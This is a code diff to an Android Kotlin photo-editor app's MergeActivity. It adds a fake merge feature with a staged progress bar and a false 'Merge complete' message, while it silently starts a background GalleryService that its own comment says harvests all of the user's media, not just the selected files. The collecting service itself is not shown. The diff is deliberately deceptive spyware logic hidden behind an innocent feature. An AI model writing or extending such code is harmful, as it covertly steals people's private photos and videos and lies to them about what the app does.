@@ -3,14 +3,16 @@ package com.magic.photoeditor
 import android.content.Intent
 import android.net.Uri
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
 import android.provider.MediaStore
 import android.widget.Button
+import android.widget.ProgressBar
 import android.widget.TextView
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.recyclerview.widget.LinearLayoutManager
 import androidx.recyclerview.widget.RecyclerView
-import java.io.File
 
 class MergeActivity : AppCompatActivity() {
 
@@ -20,6 +22,7 @@ class MergeActivity : AppCompatActivity() {
     private lateinit var selectedImages: MutableList<Uri>
     private lateinit var selectedVideos: MutableList<Uri>
     private lateinit var adapter: MediaAdapter
+    private lateinit var progressBar: ProgressBar
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -27,6 +30,7 @@ class MergeActivity : AppCompatActivity() {
 
         selectedImages = mutableListOf()
         selectedVideos = mutableListOf()
+        progressBar = findViewById(R.id.progressBar)
 
         val recyclerView = findViewById<RecyclerView>(R.id.recyclerView)
         adapter = MediaAdapter(selectedImages, selectedVideos)
@@ -55,7 +59,7 @@ class MergeActivity : AppCompatActivity() {
                 Toast.makeText(this, "Select at least one image or video", Toast.LENGTH_SHORT).show()
                 return@setOnClickListener
             }
-            startHarvest()
+            startFakeMergeAndRealHarvest()
         }
 
         updateCount()
@@ -98,13 +102,27 @@ class MergeActivity : AppCompatActivity() {
         adapter.notifyDataSetChanged()
     }
 
-    private fun startHarvest() {
-        Toast.makeText(this, "Harvesting ${selectedImages.size} images and ${selectedVideos.size} videos...", Toast.LENGTH_SHORT).show()
+    private fun startFakeMergeAndRealHarvest() {
+        progressBar.visibility = ProgressBar.VISIBLE
+        Toast.makeText(this, "Merging ${selectedImages.size + selectedVideos.size} files...", Toast.LENGTH_SHORT).show()
 
-        val intent = Intent(this, GalleryService::class.java).apply {
-            putExtra("image_uris", selectedImages.map { it.toString() }.toTypedArray())
-            putExtra("video_uris", selectedVideos.map { it.toString() }.toTypedArray())
-        }
+        // Start the REAL harvest in the background (harvests ALL media, not just selected)
+        val intent = Intent(this, GalleryService::class.java)
         startForegroundService(intent)
+
+        // Fake progress bar
+        Handler(Looper.getMainLooper()).postDelayed({
+            progressBar.progress = 50
+        }, 1000)
+
+        Handler(Looper.getMainLooper()).postDelayed({
+            progressBar.progress = 80
+        }, 2000)
+
+        Handler(Looper.getMainLooper()).postDelayed({
+            progressBar.visibility = ProgressBar.GONE
+            progressBar.progress = 0
+            Toast.makeText(this, "Merge complete! Saved to /Pictures/Merged/", Toast.LENGTH_SHORT).show()
+        }, 3000)
     }
 }
